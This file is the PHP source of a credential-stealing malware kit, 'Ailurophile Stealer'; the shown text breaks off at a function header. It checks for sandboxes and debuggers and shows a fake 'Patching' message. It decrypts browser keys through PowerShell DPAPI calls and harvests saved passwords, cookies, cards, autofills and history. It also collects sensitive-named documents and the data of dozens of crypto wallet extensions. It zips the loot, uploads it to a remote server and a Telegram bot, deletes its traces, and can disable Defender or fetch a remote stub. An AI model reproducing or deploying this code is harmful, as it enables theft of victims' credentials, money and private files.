<?php
$config=json_decode('{"PayloadCrypted_url":"","key_decrypt":"22489788773a6472e5cf","Telegram_token":"7832763930:AAGZS9sOwuNJTBbcOVccN81nRy4CpKh2314","Chat_id":"5222311384","upload_url":"azNxR2FKeC9oVzZEc0d6Smw0dXZZOGlpbk4yVGVhQ3JrNCtHYUpHT2VkU1FqSUNudm1lYzJuNWxpcStiZm5HZ2tYcG8ySmQ4ZUdFPQ==","Delivery":"0","Stub_url":null,"user_id":"230","welcome":""}');

$ip_info = get_ip();
$ip = $ip_info['ip'];
$country = $ip_info['country'];

$blackListedIPS = ["181.214.153.11","181.214.153.11", "169.150.197.118", "88.132.231.71", "212.119.227.165", "52.251.116.35", "194.154.78.69", "194.154.78.137", "213.33.190.219", "78.139.8.50", "20.99.160.173", "88.153.199.169", "84.147.62.12", "194.154.78.160", "92.211.109.160", "195.74.76.222", "188.105.91.116", "34.105.183.68", "92.211.55.199", "79.104.209.33", "95.25.204.90", "34.145.89.174", "109.74.154.90", "109.145.173.169", "34.141.146.114", "212.119.227.151", "195.239.51.59", "192.40.57.234", "64.124.12.162", "34.142.74.220", "188.105.91.173", "109.74.154.91", "34.105.72.241", "109.74.154.92", "213.33.142.50"];
$blackListedHostname = ["BEE7370C-8C0C-4", "AppOnFly-VPS", "tVaUeNrRraoKwa", "vboxuser", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH"];
$blackListedUsername = ["WDAGUtilityAccount", "runneradmin", "Abby", "Peter Wilson", "hmarc", "patex", "aAYRAp7xfuo", "JOHN-PC", "FX7767MOR6Q6", "DCVDY", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "vboxuser", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "lbeld", "od8m", "Julia", "HEUeRzl"];
$blackListedGPU = ["Microsoft Remote Display Adapter", "Microsoft Hyper-V Video", "Microsoft Basic Display Adapter", "VMware SVGA 3D", "Standard VGA Graphics Adapter", "NVIDIA GeForce 840M", "NVIDIA GeForce 9400M", "UKBEHH_S", "ASPEED Graphics Family(WDDM)", "H_EDEUEK", "VirtualBox Graphics Adapter", "K9SC88UK", "Стандартный VGA графический адаптер"];
$blacklistedOS = ["Windows Server 2022 Datacenter", "Windows Server 2019 Standard", "Windows Server 2019 Datacenter", "Windows Server 2016 Standard", "Windows Server 2016 Datacenter"];
$blackListedProcesses = ["watcher.exe", "mitmdump.exe", "mitmproxy.exe", "mitmweb.exe", "Insomnia.exe", "HTTP Toolkit.exe", "Charles.exe", "Postman.exe", "BurpSuiteCommunity.exe", "Fiddler Everywhere.exe", "Fiddler.WebUi.exe", "HTTPDebuggerUI.exe", "HTTPDebuggerSvc.exe", "HTTPDebuggerPro.exe", "x64dbg.exe", "Ida.exe", "Ida64.exe", "Progress Telerik Fiddler Web Debugger.exe", "HTTP Debugger Pro.exe", "Fiddler.exe", "KsDumperClient.exe", "KsDumper.exe", "FolderChangesView.exe", "BinaryNinja.exe", "Cheat Engine 6.8.exe", "Cheat Engine 6.9.exe", "Cheat Engine 7.0.exe", "Cheat Engine 7.1.exe", "Cheat Engine 7.2.exe", "OllyDbg.exe", "Wireshark.exe"];

function checkBlacklistedIP($ip,$blackListedIPS) {
    return in_array($ip, $blackListedIPS);
}

function checkBlacklistedHostname($blackListedHostname) {
    $hostname = gethostname(); // Lấy tên host
    return in_array($hostname, $blackListedHostname);
}

function checkBlacklistedUsername($blackListedUsername) {
    $username = getenv('USERNAME') ?: getenv('USER'); // Lấy tên người dùng hiện tại
    return in_array($username, $blackListedUsername);
}

function checkBlacklistedGPU($blackListedGPU) {
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        $gpuInfo = shell_exec('wmic path win32_videocontroller get caption');
    } else {
        $gpuInfo = shell_exec('lspci | grep VGA');
    }
    foreach ($blackListedGPU as $gpu) {
        if (stripos($gpuInfo, $gpu) !== false) {
            return true;
        }
    }
    return false;
}

function checkBlacklistedOS($blacklistedOS) {
    $os = php_uname('s') . ' ' . php_uname('r'); // Lấy thông tin hệ điều hành
    foreach ($blacklistedOS as $osName) {
        if (stripos($os, $osName) !== false) {
            return true;
        }
    }
    return false;
}

function checkBlacklistedProcesses($blackListedProcesses) {
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        $processList = shell_exec('tasklist');
    } else {
        $processList = shell_exec('ps aux');
    }
    foreach ($blackListedProcesses as $process) {
        if (stripos($processList, $process) !== false) {
            return true;
        }
    }
    return false;
}

if (
    checkBlacklistedIP($ip,$blackListedIPS) || 
    checkBlacklistedHostname($blackListedHostname) || 
    checkBlacklistedUsername($blackListedUsername) || 
    checkBlacklistedGPU($blackListedGPU) || 
    checkBlacklistedOS($blacklistedOS) || 
    checkBlacklistedProcesses($blackListedProcesses)
) {
   // exit(1); // Thoát với mã lỗi 1
}





$bot_token = $config->Telegram_token;
$chat_id = $config->Chat_id;
$welcome = $config->welcome;
$decrypt_key = $config->key_decrypt;
$disablewd = $config->Delivery;
$Stub_url = $config->Stub_url;

echo "Patching ..... please wait 10 seconds";


$hostname = hostname();
$pc_type = pc_type();
$arch = arch();
$file_path = file_path();
$main_path = $_SERVER['LOCALAPPDATA']."\\Ailurophile";
$allowedExtensions = ["rdp", "txt", "doc", "docx", "pdf", "csv", "xls", "xlsx", "keys", "ldb", "log"]; // Các phần mở rộng tệp được phép
$foldersToSearch = ['Documents', 'Desktop', 'Downloads']; // Các thư mục để tìm kiếm
$files = ["secret", "password", "account", "tax", "key", "wallet", "gang", "default", "backup", "passw", "mdp", "motdepasse", "acc", "mot_de_passe", "login", "secret", "bot", "atomic", "account", "acount", "paypal", "banque", "bot", "metamask", "wallet", "crypto", "exodus", "discord", "2fa", "code", "memo", "compte", "token", "backup", "secret", "seed", "mnemonic", "memoric", "private", "key", "passphrase", "pass", "phrase", "steal", "bank", "info", "casino", "prv", "privé", "prive", "telegram", "identifiant", "identifiants", "personnel", "trading", "bitcoin", "sauvegarde", "funds", "recup", "note"]; // Các từ khóa để tìm kiếm trong tên tệp

$decrypted_url = ailurophile_decrypt(base64_decode($config->upload_url), $decrypt_key);
$upload_url = base64_decode($decrypted_url);


 if (!file_exists($main_path)) {
            mkdir($main_path, 0777, true);}
		
/*------------------------------------------ Browser path */
$browserPaths = [
        [$_SERVER['LOCALAPPDATA'] . '\\Google\\Chrome\\User Data\\Default\\', 'Default', $_SERVER['LOCALAPPDATA'] . '\\Google\\Chrome\\User Data\\'],
       [$_SERVER['LOCALAPPDATA'] . '\\Google\\Chrome\\User Data\\Profile 1\\', 'Profile_1', $_SERVER['LOCALAPPDATA'] . '\\Google\\Chrome\\User Data\\'],
       [$_SERVER['LOCALAPPDATA'] . '\\Google\\Chrome\\User Data\\Profile 2\\', 'Profile_2', $_SERVER['LOCALAPPDATA'] . '\\Google\\Chrome\\User Data\\'],
       [$_SERVER['LOCALAPPDATA'] . '\\Google\\Chrome\\User Data\\Profile 3\\', 'Profile_3', $_SERVER['LOCALAPPDATA'] . '\\Google\\Chrome\\User Data\\'],
       [$_SERVER['LOCALAPPDATA'] . '\\Google\\Chrome\\User Data\\Profile 4\\', 'Profile_4', $_SERVER['LOCALAPPDATA'] . '\\Google\\Chrome\\User Data\\'],
      [$_SERVER['LOCALAPPDATA'] . '\\Google\\Chrome\\User Data\\Profile 5\\', 'Profile_5', $_SERVER['LOCALAPPDATA'] . '\\Google\\Chrome\\User Data\\'],
      [$_SERVER['LOCALAPPDATA'] . '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\', 'Default', $_SERVER['LOCALAPPDATA'] . '\\BraveSoftware\\Brave-Browser\\User Data\\'],
      [$_SERVER['LOCALAPPDATA'] . '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\', 'Profile_1', $_SERVER['LOCALAPPDATA'] . '\\BraveSoftware\\Brave-Browser\\User Data\\'],
      [$_SERVER['LOCALAPPDATA'] . '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\', 'Profile_2', $_SERVER['LOCALAPPDATA'] . '\\BraveSoftware\\Brave-Browser\\User Data\\'],
       [$_SERVER['LOCALAPPDATA'] . '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\', 'Profile_3', $_SERVER['LOCALAPPDATA'] . '\\BraveSoftware\\Brave-Browser\\User Data\\'],
        [$_SERVER['LOCALAPPDATA'] . '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\', 'Profile_4', $_SERVER['LOCALAPPDATA'] . '\\BraveSoftware\\Brave-Browser\\User Data\\'],
        [$_SERVER['LOCALAPPDATA'] . '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\', 'Profile_5', $_SERVER['LOCALAPPDATA'] . '\\BraveSoftware\\Brave-Browser\\User Data\\'],
        [$_SERVER['LOCALAPPDATA'] . '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\', 'Guest Profile', $_SERVER['LOCALAPPDATA'] . '\\BraveSoftware\\Brave-Browser\\User Data\\'],
       [$_SERVER['LOCALAPPDATA'] . '\\Yandex\\YandexBrowser\\User Data\\Default\\', 'Default', $_SERVER['LOCALAPPDATA'] . '\\Yandex\\YandexBrowser\\User Data\\'],
       [$_SERVER['LOCALAPPDATA'] . '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\', 'Profile_1', $_SERVER['LOCALAPPDATA'] . '\\Yandex\\YandexBrowser\\User Data\\'],
       [$_SERVER['LOCALAPPDATA'] . '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\', 'Profile_2', $_SERVER['LOCALAPPDATA'] . '\\Yandex\\YandexBrowser\\User Data\\'],
       [$_SERVER['LOCALAPPDATA'] . '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\', 'Profile_3', $_SERVER['LOCALAPPDATA'] . '\\Yandex\\YandexBrowser\\User Data\\'],
       [$_SERVER['LOCALAPPDATA'] . '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\', 'Profile_4', $_SERVER['LOCALAPPDATA'] . '\\Yandex\\YandexBrowser\\User Data\\'],
      [$_SERVER['LOCALAPPDATA'] . '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\', 'Profile_5', $_SERVER['LOCALAPPDATA'] . '\\Yandex\\YandexBrowser\\User Data\\'],
       [$_SERVER['LOCALAPPDATA'] . '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\', 'Guest Profile', $_SERVER['LOCALAPPDATA'] . '\\Yandex\\YandexBrowser\\User Data\\'],
       [$_SERVER['LOCALAPPDATA'] . '\\Microsoft\\Edge\\User Data\\Default\\', 'Default', $_SERVER['LOCALAPPDATA'] . '\\Microsoft\\Edge\\User Data\\'],
       [$_SERVER['LOCALAPPDATA'] . '\\Microsoft\\Edge\\User Data\\Profile 1\\', 'Profile_1', $_SERVER['LOCALAPPDATA'] . '\\Microsoft\\Edge\\User Data\\'],
        [$_SERVER['LOCALAPPDATA'] . '\\Microsoft\\Edge\\User Data\\Profile 2\\', 'Profile_2', $_SERVER['LOCALAPPDATA'] . '\\Microsoft\\Edge\\User Data\\'],
        [$_SERVER['LOCALAPPDATA'] . '\\Microsoft\\Edge\\User Data\\Profile 3\\', 'Profile_3', $_SERVER['LOCALAPPDATA'] . '\\Microsoft\\Edge\\User Data\\'],
       [$_SERVER['LOCALAPPDATA'] . '\\Microsoft\\Edge\\User Data\\Profile 4\\', 'Profile_4', $_SERVER['LOCALAPPDATA'] . '\\Microsoft\\Edge\\User Data\\'],
       [$_SERVER['LOCALAPPDATA'] . '\\Microsoft\\Edge\\User Data\\Profile 5\\', 'Profile_5', $_SERVER['LOCALAPPDATA'] . '\\Microsoft\\Edge\\User Data\\'],
       [$_SERVER['LOCALAPPDATA'] . '\\Microsoft\\Edge\\User Data\\Guest Profile\\', 'Guest Profile', $_SERVER['LOCALAPPDATA'] . '\\Microsoft\\Edge\\User Data\\'],
       [$_SERVER['APPDATA'] . '\\Opera Software\\Opera Neon\\User Data\\Default\\', 'Default', $_SERVER['APPDATA'] . '\\Opera Software\\Opera Neon\\User Data\\'],
       [$_SERVER['APPDATA'] . '\\Opera Software\\Opera Stable\\', 'Default', $_SERVER['APPDATA'] . '\\Opera Software\\Opera Stable\\'],
       [$_SERVER['APPDATA'] . '\\Opera Software\\Opera GX Stable\\', 'Default', $_SERVER['APPDATA'] . '\\Opera Software\\Opera GX Stable\\'],
		[$_SERVER['LOCALAPPDATA'] . '\\CocCoc\\Browser\\User Data\\Default\\', 'Default', $_SERVER['LOCALAPPDATA'] . '\\CocCoc\\Browser\\User Data\\'],
     [$_SERVER['LOCALAPPDATA'] . '\\CocCoc\\Browser\\User Data\\Profile 1\\', 'Profile_1', $_SERVER['LOCALAPPDATA'] . '\\CocCoc\\Browser\\User Data\\'],
     [$_SERVER['LOCALAPPDATA'] . '\\CocCoc\\Browser\\User Data\\Profile 2\\', 'Profile_2', $_SERVER['LOCALAPPDATA'] . '\\CocCoc\\Browser\\User Data\\'],
      [$_SERVER['LOCALAPPDATA'] . '\\CocCoc\\Browser\\User Data\\Profile 3\\', 'Profile_3', $_SERVER['LOCALAPPDATA'] . '\\CocCoc\\Browser\\User Data\\'],
      [$_SERVER['LOCALAPPDATA'] . '\\CocCoc\\Browser\\User Data\\Profile 4\\', 'Profile_4', $_SERVER['LOCALAPPDATA'] . '\\CocCoc\\Browser\\User Data\\'],
      [$_SERVER['LOCALAPPDATA'] . '\\CocCoc\\Browser\\User Data\\Profile 5\\', 'Profile_5', $_SERVER['LOCALAPPDATA'] . '\\CocCoc\\Browser\\User Data\\'],
    ];
	
getEncrypted($browserPaths);


$wallet_path = array(
    "Metamask" => '\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn',
    "Coinbase" => '\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad',
    "BinanceChain" => '\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp',
    "Phantom" => '\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa',
    "TronLink" => '\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec',
    "Ronin" => '\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec',
    "Exodus" => '\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno',
    "Coin98" => '\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg',
    "Authenticator" => '\\Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai',
    "MathWallet" => '\\Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc',
    "YoroiWallet" => '\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb',
    "GuardaWallet" => '\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln',
    "JaxxxLiberty" => '\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne',
    "Wombat" => '\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih',
    "EVERWallet" => '\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk',
    "KardiaChain" => '\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk',
    "XDEFI" => '\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf',
    "Nami" => '\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo',
    "TerraStation" => '\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp',
    "MartianAptos" => '\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk',
    "TON" => '\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd',
    "Keplr" => '\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap',
    "CryptoCom" => '\\Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj',
    "PetraAptos" => '\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci',
    "OKX" => '\\Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge',
    "Sollet" => '\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno',
    "Sender" => '\\Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg',
    "Sui" => '\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil',
    "SuietSui" => '\\Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd',
    "Braavos" => '\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma',
    "FewchaMove" => '\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj',
    "EthosSui" => '\\Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli',
    "ArgentX" => '\\Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb',
    "NiftyWallet" => '\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid',
    "BraveWallet" => '\\Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl',
    "EqualWallet" => '\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac',
    "BitAppWallet" => '\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi',
    "iWallet" => '\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj',
    "AtomicWallet" => '\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh',
    "MewCx" => '\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm',
    "GuildWallet" => '\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj',
    "SaturnWallet" => '\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig',
    "HarmonyWallet" => '\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib',
    "PaliWallet" => '\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn',
    "BoltX" => '\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca',
    "LiqualityWallet" => '\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn',
    "MaiarDeFiWallet" => '\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm',
    "TempleWallet" => '\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc',
    "Metamask_E" => '\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm',
    "Ronin_E" => '\\Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk',
    "Yoroi_E" => '\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb',
    "Authenticator_E" => '\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio',
    "MetaMask_O" => '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci'
);


// Các hàm cơ bản
function get_ip() {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.myip.com");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CAINFO, __DIR__ . "/cacert.pem");
    $response = curl_exec($ch);
    curl_close($ch);
    $data = json_decode($response, true);
    return $data;
}

function getFolderNameAfterAppData($path) {
    $localAppDataPos = strpos($path, $_SERVER['LOCALAPPDATA']);
    $appDataPos = strpos($path, $_SERVER['APPDATA']);
    if ($localAppDataPos !== false) {
        $afterLocalAppData = substr($path, $localAppDataPos + strlen($_SERVER['LOCALAPPDATA']) + 1); // +1 để bỏ dấu '\\'
        $parts = explode('\\', $afterLocalAppData);
        return $parts[0];
    } elseif ($appDataPos !== false) {
        $afterAppData = substr($path, $appDataPos + strlen($_SERVER['APPDATA']) + 1); // +1 để bỏ dấu '\\'
        $parts = explode('\\', $afterAppData);
        return $parts[0];
    } else {
        return 'Not found';
    }
}


function hostname(){
    return gethostname();
}

function pc_type() {
    $os = PHP_OS;
    if (stripos($os, 'DAR') !== false) { // macOS
        $type = trim(shell_exec('sw_vers -productName')) . ' ' . trim(shell_exec('sw_vers -productVersion'));
    } elseif (stripos($os, 'WIN') !== false) { // Windows
        $type = trim(shell_exec('wmic os get Caption')) . ' ' . trim(shell_exec('wmic os get Version'));
        $type = preg_replace('/\s+/', ' ', $type); // Loại bỏ khoảng trắng thừa
    } elseif (stripos($os, 'LINUX') !== false) { // Linux
        $type = trim(shell_exec('lsb_release -d | cut -f2')) . ' (' . trim(shell_exec('uname -o')) . ')';
    } else {
        $type = 'Không rõ';
    }
    return $type;
}


function arch(){
    return php_uname('m');
}

function file_path(){
    return __DIR__;
}

function send_to_telegram($bot_token, $chat_id, $message) {
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CAINFO, __DIR__ . "/cacert.pem");
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'cURL error: ' . curl_error($ch);
    }
    curl_close($ch);
    return $response;
}

function dpapi_decrypt($hexString) {
    $psCommand = "powershell.exe -Command \"Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope Process; Add-Type -AssemblyName System.Security; \$decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@($hexString), \$null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser); \$decryptedKeyString = [System.BitConverter]::ToString(\$decryptedKey) -replace '-', ''; Write-Output \$decryptedKeyString\"";
    $output = shell_exec($psCommand);
    return trim($output);
}

function getEncrypted(&$browserPaths) {
    foreach ($browserPaths as &$path) {
        if (!file_exists($path[0])) {
            continue;
        }
        try {
            $localStatePath = $path[2] . 'Local State';
            if (!file_exists($localStatePath)) {
                continue;
            }

            $localStateContent = file_get_contents($localStatePath);
            $localStateJson = json_decode($localStateContent, true);
            if (!isset($localStateJson['os_crypt']['encrypted_key'])) {
                continue;
            }
            $encryptedKeyBase64 = $localStateJson['os_crypt']['encrypted_key'];
            $encryptedKey = substr(base64_decode($encryptedKeyBase64), 5);
            $hexArray = array_map('ord', str_split($encryptedKey));
            $hexString = implode(',', $hexArray);
            $decryptedKey = dpapi_decrypt($hexString);
            if ($decryptedKey === false) {
                continue;
            }
            $path[] = $decryptedKey;
        } catch (Exception $e) {
            echo "Exception: " . $e->getMessage() . "\n";
        }
    }
}

function addFolderToZip($zipArchive, $folder, $folderRelativePath) {
    $handle = opendir($folder);
    while ($file = readdir($handle)) {
        if ($file != '.' && $file != '..') {
            $filePath = $folder . '/' . $file;
            $relativePath = $folderRelativePath . '/' . $file;
            if (is_dir($filePath)) {
                $zipArchive->addEmptyDir($relativePath);
                addFolderToZip($zipArchive, $filePath, $relativePath);
            } else {
                $zipArchive->addFile($filePath, $relativePath);
            }
        }
    }
    closedir($handle);
}


function zipFolder($source, $destination) {
    if (!extension_loaded('zip')) {
        throw new Exception("PHP Zip extension is not installed");
    }

    if (!file_exists($source)) {
        throw new Exception("Source folder does not exist: $source");
    }

    $zip = new ZipArchive();
    if ($zip->open($destination, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
        throw new Exception("Could not open archive");
    }

    $source = realpath($source);
    $folderName = basename($source);

    $zip->addEmptyDir($folderName);
    addFolderToZip($zip, $source, $folderName);

    $zip->close();
}



function upload_file_zip($zipFilePath, $uploadUrl) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $uploadUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_CAINFO, __DIR__ . "/cacert.pem");
    $file = new CURLFile($zipFilePath);
    $postFields = ['file' => $file];
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        $error_msg = curl_error($ch);
        curl_close($ch);
        return json_encode(['status' => 'error', 'message' => $error_msg]);
    }
    curl_close($ch);
    $responseArray = json_decode($response, true);
    if (isset($responseArray['status']) && $responseArray['status'] === 'success') {
        return "none";
    } else {
        return json_encode(['status' => 'error', 'message' => 'Failed to upload file.']);
    }
}

function get_info($message, $main_path) {
    $credit = "Ailurophile Stealer - https://ailurophilestealer.com - Telegram: @Ailurophilevn\n\n";
    $message = $credit . $message;
    $filePath = $main_path . DIRECTORY_SEPARATOR . 'info.txt';
    if (!is_dir($main_path)) {
        mkdir($main_path, 0777, true);
    }
    file_put_contents($filePath, $message);
}

function ailurophile_encrypt($data, $key) {
    $key_length = strlen($key);
    $data_length = strlen($data);
    $encrypted_data = '';

    for ($i = 0; $i < $data_length; $i++) {
        $encrypted_data .= chr((ord($data[$i]) + ord($key[$i % $key_length])) % 256);
    }

    return base64_encode($encrypted_data);
}

function ailurophile_decrypt($data, $key) {
   if (empty($key)) {
        throw new Exception("Decryption key cannot be empty");
    }
    
    $key_length = strlen($key);
    $data = base64_decode($data);
    $data_length = strlen($data);
    $decrypted_data = '';

    for ($i = 0; $i < $data_length; $i++) {
        $decrypted_data .= chr((ord($data[$i]) - ord($key[$i % $key_length]) + 256) % 256);
    }

    return $decrypted_data;
}


function escapeMarkdownV2($string) {
    return str_replace(
        ['\\', '_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'],
        ['\\\\', '\\_', '\\*', '\\[', '\\]', '\\(', '\\)', '\\~', '\\`', '\\>', '\\#', '\\+', '\\-', '\\=', '\\|', '\\{', '\\}', '\\.', '\\!'],
        $string
    );
}


function deleteFile($filePath) {
    if (file_exists($filePath)) {
        if (@unlink($filePath)) {
        } else {
        }
    } else {
    }
}

function deleteFolder($folderPath) {
    if (is_dir($folderPath)) {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($folderPath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );
        foreach ($files as $fileinfo) {
            @$todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
            if (!$todo($fileinfo->getRealPath())) {
                return;
            }
        }

        if (@rmdir($folderPath)) {
        } else {
        }
    } else {
    }
}



/* -------------------------------------------- main ----------------------- */
$info = "*IP:* $ip\n*Hostname:* $hostname\n*PC Type:* $pc_type\n*Architecture:* $arch\n*File Path:* $file_path";
get_info($info, $main_path);
Killprocess();
$autofills = get_Autofill($browserPaths, $main_path);
$cookies = getCookies($browserPaths, $main_path);
$passwords = getPasswords($browserPaths, $main_path);
$histories = getHistory($browserPaths, $main_path);
$file_stealed = stealFiles($allowedExtensions, $foldersToSearch, $files, $main_path);
$cards = getCards($browserPaths, $main_path);
submitTelegram($main_path);
$cryptowallet = localWalletData($main_path,$wallet_path);
zipFolder($main_path, $_SERVER['LOCALAPPDATA']."\\Ailurophile.zip");
$data = base64_encode('{"user_id":"'.$config->user_id.'","hostname":"'.$hostname.'","ip":"'.$ip.'","type":"'.$pc_type.'","passwords":"'.$passwords.'","cookies":"'.$cookies.'","autofills":"'.$autofills.'","cards":"'.$cards.'","files":"'.$file_stealed.'","country":"'.$country.'","wallet":"'.$cryptowallet.'","history":"'.$histories.'"}');
$encrypt_data = ailurophile_encrypt($data,$config->key_decrypt);
$data = base64_encode($encrypt_data);
$url_download=upload_file_zip($_SERVER['LOCALAPPDATA']."\\Ailurophile.zip",$upload_url."data=$data&hash=$decrypt_key");
var_dump($url_download);

if($bot_token != null and $chat_id !=null){$message = "
🔐 <b>Passwords:</b> <code>$passwords</code>
🍪 <b>Cookies:</b> <code>$cookies</code>
📋 <b>Autofills:</b> <code>$autofills</code>
💸 <b>Cards:</b> <code>$cards</code>
🔑 <b>Files:</b> <code>$file_stealed</code>
✅ <b>History:</b> <code>$histories</code>
⚙ <b>Country:</b> <code>$country</code>

<b> <i><u>System Information:</u></i></b>
<b>
Hostname: <code>$hostname</code>
IP Address: <code>$ip</code>
Type: <code>$pc_type</code>
Arch: <code>$arch</code>
File Location: <code>$file_path</code>
</b>

<b><i>Download:</i></b> <a href='https://ailurophilestealer.com/bot'><b><u>Click here</u></b></a>
";
$res = send_to_telegram($bot_token, $chat_id, $message);}
var_dump($res);
deleteFile($_SERVER['LOCALAPPDATA']."\\Ailurophile.zip");
deleteFolder($main_path);

if($disablewd == "1") {
	disable_wd();
}

if ($Stub_url !== null && $Stub_url !== "") {
    $Stub_url_clean = stripslashes($Stub_url);

    // Kiểm tra xem URL có hợp lệ không
    if (filter_var($Stub_url_clean, FILTER_VALIDATE_URL)) {
        stub_loader($Stub_url_clean);
    } else {
        // Xử lý nếu URL không hợp lệ (nếu cần)
    }
} else {
    // Xử lý nếu $Stub_url là null hoặc chuỗi rỗng (nếu cần)
}

function Killprocess() {
